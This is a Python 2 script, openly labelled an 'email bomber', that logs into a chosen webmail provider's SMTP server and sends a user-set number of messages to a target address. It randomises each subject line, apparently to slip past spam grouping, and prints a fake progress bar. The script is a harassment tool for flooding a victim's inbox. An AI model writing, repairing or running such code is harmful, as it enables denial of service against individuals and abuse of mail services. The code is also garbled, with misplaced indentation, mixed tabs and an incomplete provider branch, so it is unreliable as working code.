##***************************************************#
######################################################
## Python Email Bomber
## Made by John J Butler
## 
## I am not responsible for third party use.
#####################################################
##**************************************************#

#!/usr/bin/python

import os
import smtplib
import getpass
import sys


#Collect User Input:
#Input Variables
server = raw_input ('Email Server Alias: ') #Specify the mail server: gmail, yahoo, etc..
user = raw_input('User: ') #Enter your email username
passwd = getpass.getpass('Pass: ') #Enter your email password
to = raw_input('\nTarget Email: ') #email you wish to spam with emails
subject = raw_input('Subject: ') #subject of email
body = raw_input('Message: ') #message to put inside the emails
total = input('Ubiquity:   ') #how many emails to send


#Specify Server and Port for each SMTP server offered

if server == 'gmail':
    smtp_server = 'smtp.gmail.com'
    port = 587
elif server == 'outlook':
    smtp_server = 'smtp-mail.outlook.com'
    port = 587
elif server == 'icloud':
    smtp_server = 'smtp.mail.me.com'
    port = 587
elif server == 'office365':
    smtp_server = 'smtp.office365.com'
    port = 587
elif server == 'aol':
    smtp_server = 'smtp.aol.com'
    port = 587
elif server == 'yahoo':
    smtp_server = 'smtp.mail.yahoo.com'
    port = 587
elif server == 'hotmail':
    smtp_server = 'smtp.mail.hotmail.com'
    port = 587
else:
    print 'Option Invalid. Input Options: gmail, outlook, icloud, office365, aol, yahoo, hotmail'
    sys.exit()
    
    print ''


#Individual instructions for each SMTP server
try: 
    server = smtplib.SMTP(smtp_server,port)
    server.ehlo()
    
#Gmail
if smtp_server == "smtp.gmail.com":
            server.starttls()
    server.login(user,passwd)

    for i in range(1, total+1):
        subject = os.urandom(9)
        msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + body #Says Who it is from, The Subject & the Message (body).
        server.sendmail(user,to,msg) #Sends it

#Show some fake progress to satisfy the eager user
	import time
	print("Sending emails...")
	print("")

#Print progress on screen

    print "Total emails sent: %i" % i
    print("")
    	
#Additional fake progress to satisfy the eager user

	print("---PROGRESS---")
	time.sleep(1.0)
	print("10%  ###")
	time.sleep(0.5)
	print("20$  #####")
	time.sleep(2.5)
	print("30%  #######")
	time.sleep(1.0)
	print("40%  #########")
	time.sleep(0.5)
	print("50%  ###########")
	time.sleep(1.0)
	print("60%  #############")
	time.sleep(1.5)
	print("70%  ###############")
	time.sleep(1.5)
	print("80%  #################")
	time.sleep(1.0)
	print("90%  ###################")
	time.sleep(2.0)
	print("Almost Done...")
	time.sleep(3.0)
	print("100% #####################")
	time.sleep(1.0)
    print '\n Done !!!'
    

#Allow KeyboardInterrupt
except KeyboardInterrupt:
    print '[-] Canceled'
    sys.exit()

#Exit upon invalid login (SMTP Authentication Error: Modify to loop back to login prompt)
except smtplib.SMTPAuthenticationError:
    print '\n[!] The username or password you entered is incorrect.'
    sys.exit()
